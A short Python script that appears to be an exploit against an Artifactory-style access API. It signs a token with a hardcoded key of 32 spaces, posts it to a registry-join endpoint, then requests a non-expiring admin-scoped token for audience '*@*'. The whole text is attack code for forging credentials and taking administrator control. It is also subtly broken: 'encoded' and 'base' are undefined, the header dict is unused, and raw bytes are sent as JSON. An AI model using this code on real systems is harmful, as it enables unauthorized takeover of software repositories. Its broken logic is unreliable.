import hmac
import hashlib
import requests
join = '/access/api/v1/registry/join'
headers = {'alg': 'HS256', 'kid': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'}
signature = hmac.new(b' ' * 32, encoded, hashlib.sha256).digest()
requests.post(base + join, json={'token': signature})
payload = {'expires_in': 0, 'scope': 'applied-permissions/admin', 'audience': '*@*'}
requests.post(base + '/access/api/v1/tokens', data=payload)
